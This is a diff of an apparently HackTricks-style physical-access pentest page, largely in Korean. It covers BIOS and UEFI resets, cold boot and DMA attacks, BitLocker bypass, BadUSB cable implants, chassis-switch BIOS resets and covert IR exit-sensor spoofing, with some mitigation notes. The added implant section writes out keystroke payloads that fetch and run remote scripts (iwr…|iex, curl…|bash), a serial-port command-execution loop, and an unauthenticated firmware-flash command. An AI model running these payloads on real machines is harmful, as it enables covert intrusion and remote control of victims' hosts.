@@ -2,39 +2,39 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## BIOS 비밀번호 복구 및 시스템 보안
+## BIOS Password Recovery and System Security
 
-**BIOS 재설정**은 여러 방법으로 수행할 수 있습니다. 대부분의 마더보드에는 약 **30분** 동안 제거하면 비밀번호를 포함한 BIOS 설정을 초기화하는 **배터리**가 있습니다. 또는 특정 핀을 연결하여 설정을 초기화할 수 있도록 마더보드의 **점퍼**를 조정할 수 있습니다.
+**Resetting the BIOS**은 여러 가지 방법으로 수행할 수 있습니다. 대부분의 메인보드에는 **배터리**가 포함되어 있으며, 이를 약 **30분** 정도 제거하면 암호를 포함한 BIOS 설정이 초기화됩니다. 대안으로는 **메인보드의 점퍼**를 조정하여 특정 핀을 연결함으로써 이러한 설정을 초기화할 수 있습니다.
 
-하드웨어 조정이 불가능하거나 현실적이지 않은 상황에서는 **소프트웨어 도구**가 해결책이 될 수 있습니다. **Live CD/USB**로 시스템을 부팅하고 **Kali Linux**와 같은 배포판을 사용하면 **_killCmos_** 및 **_CmosPWD_**와 같은 도구에 접근하여 BIOS 비밀번호 복구를 도울 수 있습니다.
+하드웨어 조정이 불가능하거나 실용적이지 않은 상황에서는 **소프트웨어 도구**가 해결책이 될 수 있습니다. **Kali Linux**와 같은 배포판의 **Live CD/USB**로 시스템을 부팅하면 **_killCmos_**와 **_CmosPWD_** 같은 도구에 접근할 수 있어 BIOS 암호 복구에 도움이 됩니다.
 
-BIOS 비밀번호를 모르는 경우, 틀려서 입력을 **세 번** 하면 일반적으로 오류 코드가 발생합니다. 이 코드는 [https://bios-pw.org](https://bios-pw.org) 같은 웹사이트에서 사용해 사용 가능한 비밀번호를 얻을 수 있습니다.
+BIOS 암호를 모르는 경우, 틀리게 입력하면 보통 **세 번** 입력 후 오류 코드가 발생합니다. 이 오류 코드는 [https://bios-pw.org](https://bios-pw.org) 같은 웹사이트에 입력해 사용 가능한 암호를 얻는 데 활용될 수 있습니다.
 
-### UEFI 보안
+### UEFI Security
 
-전통적인 BIOS 대신 **UEFI**를 사용하는 최신 시스템에서는 도구 **chipsec**을 사용해 UEFI 설정을 분석하고 수정할 수 있으며, **Secure Boot** 비활성화도 포함됩니다. 이는 다음 명령으로 수행할 수 있습니다:
+전통적인 BIOS 대신 **UEFI**를 사용하는 최신 시스템에서는 **chipsec** 도구를 사용하여 UEFI 설정을 분석하고 수정할 수 있으며, **Secure Boot** 비활성화 같은 작업도 가능합니다. 다음 명령으로 수행할 수 있습니다:
 ```bash
 python chipsec_main.py -module exploits.secure.boot.pk
 ```
 ---
 
-## RAM 분석 및 Cold Boot Attacks
+## RAM Analysis and Cold Boot Attacks
 
-RAM은 전원이 차단된 후에도 보통 **1 to 2 minutes** 동안 데이터를 유지합니다. 액체 질소와 같은 냉각 물질을 적용하면 이 지속시간을 **10 minutes**까지 연장할 수 있습니다. 이 연장된 기간 동안 **dd.exe**와 **volatility** 같은 도구를 사용하여 분석을 위한 **memory dump**를 생성할 수 있습니다.
+RAM은 전원이 차단된 후에도 짧게 데이터가 유지되며, 보통 **1 to 2 minutes** 정도 지속됩니다. 액체 질소 같은 차가운 물질을 사용하면 이 지속 시간을 **10 minutes**까지 연장할 수 있습니다. 이 연장된 기간 동안 **memory dump**를 생성하여 **dd.exe**, **volatility**와 같은 도구로 분석할 수 있습니다.
 
 ---
 
 ## Direct Memory Access (DMA) Attacks
 
-**INCEPTION**은 DMA를 통해 물리적 메모리 조작을 목적으로 설계된 도구로, **FireWire**나 **Thunderbolt** 같은 인터페이스와 호환됩니다. 메모리를 패치하여 어떤 비밀번호든 통과시키도록 함으로써 로그인 절차를 우회할 수 있습니다. 다만 **Windows 10** 시스템에는 효과가 없습니다.
+**INCEPTION**은 DMA를 통해 물리적 메모리를 조작하도록 설계된 도구로, **FireWire**나 **Thunderbolt** 같은 인터페이스와 호환됩니다. 메모리를 패치해 어떤 비밀번호든 통과하도록 만들어 로그인 절차를 우회할 수 있습니다. 다만 **Windows 10** 시스템에는 효과적이지 않습니다.
 
 ---
 
 ## Live CD/USB for System Access
 
-**_sethc.exe_**나 **_Utilman.exe_** 같은 시스템 바이너리를 **_cmd.exe_** 복사본으로 교체하면 시스템 권한의 명령 프롬프트를 얻을 수 있습니다. **chntpw** 같은 도구를 사용해 Windows 설치의 **SAM** 파일을 편집하여 비밀번호를 변경할 수 있습니다.
+**_sethc.exe_**나 **_Utilman.exe_** 같은 시스템 바이너리를 **_cmd.exe_** 복사본으로 교체하면 시스템 권한의 명령 프롬프트를 얻을 수 있습니다. **chntpw** 같은 도구로 Windows 설치의 **SAM** 파일을 편집해 비밀번호를 변경할 수도 있습니다.
 
-**Kon-Boot**은 Windows 커널이나 UEFI를 일시적으로 수정하여 비밀번호를 모른 채로 Windows에 로그인할 수 있게 해주는 도구입니다. More information can be found at [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).
+**Kon-Boot**은 Windows 커널이나 UEFI를 일시적으로 수정하여 비밀번호를 모르는 상태에서도 Windows에 로그인할 수 있게 해주는 도구입니다. 자세한 내용은 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)에서 확인할 수 있습니다.
 
 ---
 
@@ -44,91 +44,122 @@ RAM은 전원이 차단된 후에도 보통 **1 to 2 minutes** 동안 데이터�
 
 - **Supr**: BIOS 설정에 접근합니다.
 - **F8**: Recovery 모드로 진입합니다.
-- Windows 배너 이후 **Shift**를 누르면 autologon을 우회할 수 있습니다.
+- Windows 배너 이후에 **Shift**를 누르면 autologon을 우회할 수 있습니다.
 
 ### BAD USB Devices
 
-**Rubber Ducky**와 **Teensyduino** 같은 장치는 **bad USB** 장치를 만드는 플랫폼으로 사용되며, 타깃 컴퓨터에 연결되면 미리 정의된 페이로드를 실행할 수 있습니다.
+**Rubber Ducky**, **Teensyduino** 같은 장치는 **bad USB** 장치를 만들기 위한 플랫폼으로, 대상 컴퓨터에 연결되면 미리 정의된 페이로드를 실행할 수 있습니다.
 
 ### Volume Shadow Copy
 
-관리자 권한으로 PowerShell을 통해 **SAM** 파일을 포함한 민감한 파일의 복사본을 생성할 수 있습니다.
+관리자 권한을 통해 PowerShell로 **SAM** 파일을 포함한 민감한 파일의 복사본을 생성할 수 있습니다.
+
+## BadUSB / HID Implant Techniques
+
+### Wi-Fi managed cable implants
+
+- **ESP32-S3** 기반 임플란트(예: **Evil Crow Cable Wind**)는 USB-A→USB-C 또는 USB-C↔USB-C 케이블 안에 숨겨져 순수하게 USB 키보드로만 열거되며, C2 스택을 Wi-Fi로 노출합니다. 운영자는 피해자 호스트에서 케이블에 전원만 공급하면 되고, `Evil Crow Cable Wind`라는 이름의 핫스팟(password: `123456789`)을 만든 뒤 [http://cable-wind.local/](http://cable-wind.local/) (또는 할당된 DHCP 주소)로 접속해 내장 HTTP 인터페이스에 접근하면 됩니다.
+- 브라우저 UI에는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* 탭이 제공됩니다. 저장된 페이로드는 OS별로 태깅되며, 키보드 레이아웃은 실시간으로 전환되고 VID/PID 문자열을 변경해 알려진 주변기기를 흉내 낼 수 있습니다.
+- C2가 케이블 내부에 있으므로, 폰으로 페이로드를 준비하고 실행을 트리거하며 Wi-Fi 자격증명을 관리할 수 있어 호스트 OS에 접근하지 않고도 짧은 침투 시간에 유리합니다.
+
+### OS-aware AutoExec payloads
+
+- AutoExec 규칙은 USB 열거 직후 하나 이상의 페이로드를 즉시 실행하도록 바인딩합니다. 임플란트는 가벼운 OS 지문 인식을 수행해 일치하는 스크립트를 선택합니다.
+- 예시 워크플로우:
+- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
+- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
+- 실행이 무인으로 이루어지기 때문에 단순히 충전 케이블을 교체하는 것만으로도 로그인된 사용자 컨텍스트에서 “plug-and-pwn” 초기 접근을 달성할 수 있습니다.
+
+### HID-bootstrapped remote shell over Wi-Fi TCP
+
+1. **Keystroke bootstrap:** 저장된 페이로드가 콘솔을 열고 새 USB 직렬 장치로 들어오는 내용을 실행하는 루프를 붙여넣습니다. 최소한의 Windows 변형은 다음과 같습니다:
+```powershell
+$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
+$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
+```
+2. **Cable bridge:** 임플란트는 USB CDC 채널을 열린 상태로 유지하는 동안 ESP32-S3가 operator 쪽으로 TCP client (Python script, Android APK, or desktop executable)를 실행합니다. TCP session에 입력된 바이트는 위의 serial 루프에 전달되어 air-gapped 호스트에서도 remote command execution을 제공합니다. 출력이 제한적이어서 운영자는 보통 blind commands (account creation, staging additional tooling, etc.)를 실행합니다.
+
+### HTTP OTA update surface
+
+- 동일한 web stack은 보통 인증되지 않은 firmware 업데이트를 노출합니다. Evil Crow Cable Wind는 `/update`를 리스닝하고 업로드된 바이너리를 그대로 플래시합니다:
+```bash
+curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
+```
+- 현장 운영자는 케이블을 열지 않고도 교전 중간에 기능을 hot-swap할 수 있으며(예: USB Army Knife 펌웨어를 flash), implant가 대상 호스트에 계속 연결된 상태에서 새로운 기능으로 전환할 수 있다.
+
+## BitLocker 암호화 우회
+
+BitLocker 암호화는 메모리 덤프 파일(**MEMORY.DMP**) 내에서 **recovery password**가 발견될 경우 잠재적으로 우회될 수 있다. 이 목적을 위해 **Elcomsoft Forensic Disk Decryptor** 또는 **Passware Kit Forensic** 같은 도구를 사용할 수 있다.
 
 ---
 
-## Bypassing BitLocker Encryption
+## 복구 키 추가를 위한 소셜 엔지니어링
 
-BitLocker 암호화는 **recovery password**가 메모리 덤프 파일(**MEMORY.DMP**)에서 발견되면 잠재적으로 우회될 수 있습니다. **Elcomsoft Forensic Disk Decryptor**나 **Passware Kit Forensic** 같은 도구를 사용할 수 있습니다.
-
----
-
-## Social Engineering for Recovery Key Addition
-
-사용자에게 0으로 구성된 새 복구 키를 추가하는 명령을 실행하도록 설득하는 등의 소셜 엔지니어링 전술을 통해 BitLocker 복구 키를 추가할 수 있으며, 이렇게 하면 복호화 과정이 단순해집니다.
+새 BitLocker 복구 키는 소셜 엔지니어링 전술을 통해 추가할 수 있다. 사용자가 모든 값이 0으로 구성된 새 복구 키를 추가하는 명령을 실행하도록 설득하면 복호화 과정이 단순화된다.
 
 ---
 
-## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS
+## Chassis Intrusion / Maintenance Switches를 이용해 BIOS를 공장 초기화로 되돌리기
 
-많은 최신 노트북 및 소형 폼팩터 데스크탑에는 Embedded Controller (EC)와 BIOS/UEFI 펌웨어가 모니터링하는 **chassis-intrusion switch**가 포함되어 있습니다. 스위치의 주된 목적은 장치가 열렸을 때 경고를 발생시키는 것이지만, 제조업체는 때때로 스위치가 특정 패턴으로 토글될 때 트리거되는 **undocumented recovery shortcut**을 구현하기도 합니다.
+많은 최신 노트북 및 소형 데스크탑에는 Embedded Controller(EC)와 BIOS/UEFI firmware에서 모니터링하는 **chassis-intrusion switch**가 포함되어 있다. 스위치의 주 목적은 장치가 열렸을 때 경고를 발생시키는 것이지만, 벤더는 때때로 스위치를 특정 패턴으로 토글할 때 트리거되는 **undocumented recovery shortcut**을 구현하기도 한다.
 
-### How the Attack Works
+### 공격 작동 방식
 
-1. 스위치는 EC의 **GPIO interrupt**에 연결되어 있습니다.
-2. EC에서 실행되는 펌웨어는 **timing and number of presses**를 기록합니다.
-3. 하드코딩된 패턴이 인식되면 EC는 *mainboard-reset* 루틴을 호출하여 **시스템 NVRAM/CMOS의 내용을 지웁니다**.
-4. 다음 부팅에서 BIOS는 기본값을 로드합니다 – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.
+1. 스위치는 EC의 **GPIO interrupt**에 연결되어 있다.
+2. EC에서 실행되는 펌웨어는 **timing and number of presses**를 추적한다.
+3. 하드코딩된 패턴이 인식되면 EC는 *mainboard-reset* 루틴을 호출하여 시스템 **NVRAM/CMOS의 내용을 삭제**한다.
+4. 다음 부팅 시 BIOS는 기본값을 로드한다 – **supervisor password, Secure Boot keys, 및 모든 사용자 정의 설정이 초기화된다**.
 
-> Secure Boot가 비활성화되고 펌웨어 비밀번호가 제거되면, 공격자는 단순히 외부 OS 이미지를 부팅해 내부 드라이브에 대한 무제한 접근을 얻을 수 있습니다.
+> Secure Boot가 비활성화되고 firmware password가 사라지면, 공격자는 단순히 외부 OS 이미지를 부팅하여 내부 드라이브에 대한 무제한 접근 권한을 얻을 수 있다.
 
-### Real-World Example – Framework 13 Laptop
+### 실사용 사례 – Framework 13 Laptop
 
-The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
+Framework 13(11th/12th/13th-gen)에 대한 recovery shortcut은 다음과 같다:
 ```text
 Press intrusion switch  →  hold 2 s
 Release                 →  wait 2 s
 (repeat the press/release cycle 10× while the machine is powered)
 ```
-열 번째 사이클 이후 EC는 다음 부팅 때 BIOS에 NVRAM을 초기화하도록 지시하는 플래그를 설정합니다. 전체 절차는 ~40 s가 걸리며 **드라이버 하나만 있으면 됩니다**.
+After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **nothing but a screwdriver**.
 
-### 일반 악용 절차
+### Generic Exploitation Procedure
 
-1. 대상의 전원을 켜거나 suspend-resume하여 EC가 동작하도록 만듭니다.
-2. 바닥 커버를 제거해 intrusion/maintenance 스위치를 노출시킵니다.
-3. 공급업체별 토글 패턴을 재현합니다(문서, 포럼을 참조하거나 EC firmware를 리버스엔지니어링).
-4. 다시 조립하고 재부팅합니다 – firmware 보호 기능이 비활성화되어 있어야 합니다.
-5. Live USB(예: Kali Linux)로 부팅한 후 일반적인 post-exploitation(credential dumping, data exfiltration, 악성 EFI 바이너리 설치 등)을 수행합니다.
+1. Power-on or suspend-resume the target so the EC is running.
+2. Remove the bottom cover to expose the intrusion/maintenance switch.
+3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
+4. Re-assemble and reboot – firmware protections should be disabled.
+5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).
 
-### 탐지 및 완화
+### Detection & Mitigation
 
-* OS 관리 콘솔에 chassis-intrusion 이벤트를 기록하고 예기치 않은 BIOS 리셋과 상관관계를 확인합니다.
-* 나사/커버에 **tamper-evident seals**를 사용하여 개봉을 감지합니다.
-* 장치를 **physically controlled areas**에 보관하십시오; 물리적 접근은 완전한 침해와 같다고 가정합니다.
-* 가능한 경우 공급업체의 “maintenance switch reset” 기능을 비활성화하거나 NVRAM 리셋에 대해 추가적인 암호화 인증을 요구합니다.
+* Log chassis-intrusion events in the OS management console and correlate with unexpected BIOS resets.
+* Employ **tamper-evident seals** on screws/covers to detect opening.
+* Keep devices in **physically controlled areas**; assume that physical access equals full compromise.
+* Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation for NVRAM resets.
 
 ---
 
 ## Covert IR Injection Against No-Touch Exit Sensors
 
-### 센서 특성
-- 일반적인 “wave-to-exit” 센서는 near-IR LED 발광부와 TV-remote 스타일 수신 모듈을 쌍으로 사용하며, 올바른 캐리어(≈30 kHz)의 펄스를 여러 번(~4–10) 감지한 뒤에만 logic high를 보고합니다.
-- 플라스틱 shroud는 발신기와 수신기가 서로를 직접 보지 못하게 하므로 컨트롤러는 검증된 캐리어가 근처 반사에서 온 것으로 가정하고 도어 스트라이크를 여는 릴레이를 구동합니다.
-- 컨트롤러가 대상이 존재한다고 판단하면 종종 출력 변조(envelope)를 변경하지만, 수신기는 필터된 캐리어에 맞는 어떤 burst도 계속 수용합니다.
+### Sensor Characteristics
+- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
+- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
+- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.
 
-### 공격 워크플로
-1. **방출 프로파일 캡처** – controller 핀에 logic analyser를 연결하여 내부 IR LED를 구동하는 pre-detection 및 post-detection 파형을 기록합니다.
-2. **오직 “post-detection” 파형만 재생** – 기본 발신기를 제거하거나 무시하고, 처음부터 이미 트리거된 패턴으로 외부 IR LED를 구동합니다. 수신기는 펄스 수/주파수만 중요하게 생각하기 때문에 스푸핑된 캐리어를 진짜 반사로 간주하고 릴레이 라인을 활성화합니다.
-3. **전송을 게이팅** – 캐리어를 조정된 burst로 전송(예: 수십 밀리초 on, 유사한 off)하여 수신기의 AGC나 간섭 처리 로직을 포화시키지 않고 최소 펄스 수를 전달합니다. 연속 방출은 센서를 빠르게 둔감하게 해 릴레이가 동작하지 않게 만듭니다.
+### Attack Workflow
+1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
+2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
+3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.
 
-### 장거리 반사 주입
-- 벤치용 LED를 고출력 IR 다이오드, MOSFET 드라이버, 집광 광학으로 교체하면 ~6 m 거리에서 신뢰성 있게 트리거할 수 있습니다.
-- 공격자는 수신기 개구부에 대한 직접 시야가 필요하지 않습니다; 유리를 통해 보이는 실내 벽면, 선반, 문틀 등을 조준하면 반사된 에너지가 약 30°의 시야각으로 들어와 근거리 손 흔들기와 유사한 효과를 냅니다.
-- 수신기는 약한 반사만을 예상하기 때문에 훨씬 강한 외부 빔이 여러 표면에서 반사되어도 여전히 검출 임계값을 넘을 수 있습니다.
+### Long-Range Reflective Injection
+- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
+- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
+- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.
 
-### 무장화된 공격용 토치
-- 상용 손전등 내부에 드라이버를 내장하면 도구를 평범한 물건으로 숨길 수 있습니다. 가시 LED를 수신기 밴드에 맞는 고출력 IR LED로 교체하고, ≈30 kHz 펄스를 생성하기 위해 ATtiny412(또는 유사)를 추가하며, LED 전류를 싱크하기 위해 MOSFET을 사용합니다.
-- 망원 줌 렌즈는 사거리/정밀도를 위해 빔을 좁히고, MCU 제어 하의 진동 모터는 가시광을 방출하지 않고도 변조가 활성화되었음을 햅틱으로 확인시켜줍니다.
-- 약간씩 다른 캐리어 주파수와 envelopes를 가진 여러 저장된 변조 패턴을 순환하면 리브랜딩된 센서군 전반과의 호환성이 높아져, 연산자가 릴레이의 클릭 소리가 날 때까지 반사 표면을 스윕할 수 있습니다.
+### Weaponised Attack Torch
+- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
+- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
+- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.
 
 ---
 
@@ -137,5 +168,6 @@ Release                 →  wait 2 s
 - [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
 - [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
 - [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
+- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
 
 {{#include ../banners/hacktricks-training.md}}
